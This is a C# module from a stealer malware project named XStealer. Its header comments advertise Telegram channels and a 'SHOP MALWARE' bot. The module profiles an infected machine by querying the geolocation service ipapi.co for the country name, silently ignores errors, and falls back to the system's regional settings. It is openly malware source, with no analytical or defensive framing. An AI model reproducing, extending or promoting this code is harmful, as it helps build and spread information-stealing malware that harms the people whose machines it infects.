// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Machine
{
    using System.Globalization;
    using System.Net;
    using System.Xml;

    public static class CountryUser
    {
        public static string GetLocal()
        {
            string result;
            try
            {
                var ri = new RegionInfo(CultureInfo.CurrentCulture.Name);
                result = Info ?? ri.EnglishName;
            }
            catch { result = "Unknown Country"; }
            result = result.Replace(' ', '_');
            return result;
        }

        private static string Info
        {
            get
            {
                string country = string.Empty;
                try
                {
                    var doc = new XmlDocument();
                    doc.LoadXml(GetSourceXml("https://ipapi.co/xml"));
                    country = doc.GetElementsByTagName("country_name")[0]?.InnerText;
                }
                catch { }
                return country;
            }
        }
        private static string GetSourceXml(string url)
        {
            string xmlStr = string.Empty;
            try
            {
                using var wc = new WebClient();
                xmlStr = wc?.DownloadString(url);
            }
            catch { }
            return xmlStr;
        }
    }
}